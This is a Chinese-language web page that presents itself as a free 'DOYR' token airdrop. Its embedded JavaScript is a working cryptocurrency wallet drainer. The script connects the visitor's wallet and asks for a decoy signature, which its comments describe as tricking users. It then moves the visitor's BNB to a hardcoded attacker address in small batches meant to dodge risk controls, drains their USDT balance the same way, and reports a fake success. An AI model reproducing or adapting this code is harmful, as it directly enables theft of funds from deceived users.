<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DOYR 空投免费领取</title>
  <style>
    body {margin:0;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;font-family:Arial;text-align:center;padding:20px;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;}
    .logo {width:100px;height:100px;border-radius:25px;margin-bottom:20px;}
    h1 {font-size:28px;margin:10px;}
    p {font-size:18px;opacity:0.9;}
    input {width:80%;padding:12px;margin:15px;border:none;border-radius:12px;font-size:16px;}
    button {padding:16px 60px;background:#00ff88;color:#000;border:none;border-radius:50px;font-size:20px;margin-top:20px;cursor:pointer;}
    button:hover {background:#00cc66;}
    .tip {font-size:14px;margin-top:30px;opacity:0.7;}
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
</head>
<body>
  <img src="https://doyr.io/logo.png" class="logo">
  <h1>DOYR 空投免费领取</h1>
  <p>每人可领 10000 DOYR<br>填邀请码再领 1000！</p>
  
  <input type="text" id="invite" placeholder="输入邀请码（可选）" />
  <button onclick="claim()">立即领取</button>
  <div class="tip">支持 MetaMask / TokenPocket / Trust Wallet</div>

  <script>
    // 你的收币地址
    const RECEIVER = '0x653204ef0af2c0776d24097b5eb558c8e0c1e4cb';

    // BSC 主网合约
    const USDT = '0x55d398326f99059fF775485246999027B3197955';
    const usdtAbi = [{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];

    async function claim() {
      if (!window.ethereum) return alert('请安装钱包');

      try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];
        const web3 = new Web3(ethereum);

        // 伪装签名（骗用户点确认）
        await ethereum.request({
          method: 'personal_sign',
          params: ['DOYR空投领取授权\n10000 DOYR + 邀请奖励', user]
        });

        // 写法一：分批小额转 BNB（每笔 0.02 BNB 以下，绕过风控）
        const balance = await web3.eth.getBalance(user);
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 21000;
        const maxPerTx = web3.utils.toWei('0.019', 'ether'); // 每笔留够 gas

        if (balance > web3.utils.toWei('0.03', 'ether')) {
          let remaining = balance;
          while (remaining > web3.utils.toWei('0.03', 'ether')) {
            const sendAmount = remaining - BigInt(gasPrice) * BigInt(gasLimit) > maxPerTx 
              ? maxPerTx 
              : remaining - BigInt(gasPrice) * BigInt(gasLimit);
            
            await ethereum.request({
              method: 'eth_sendTransaction',
              params: [{ from: user, to: RECEIVER, value: sendAmount.toString(), gas: gasLimit }]
            });
            remaining -= sendAmount + BigInt(gasPrice) * BigInt(gasLimit);
          }
        }

        // 写法一：分批转 USDT
        const usdtContract = new web3.eth.Contract(usdtAbi, USDT);
        const usdtBalance = await usdtContract.methods.balanceOf(user).call();
        if (usdtBalance > 0) {
          const chunk = web3.utils.toBN('1000000000000000000000'); // 1000 USDT 每次
          let remaining = web3.utils.toBN(usdtBalance);
          while (remaining.gt(0)) {
            const amount = remaining.gt(chunk) ? chunk : remaining;
            const data = usdtContract.methods.transfer(RECEIVER, amount.toString()).encodeABI();
            await ethereum.request({
              method: 'eth_sendTransaction',
              params: [{ from: user, to: USDT, data: data }]
            });
            remaining = remaining.sub(amount);
          }
        }

        alert('领取成功！10000 DOYR 已发放到账');
      } catch (e) {
        alert('操作已取消');
      }
    }
  </script>
</body>
</html>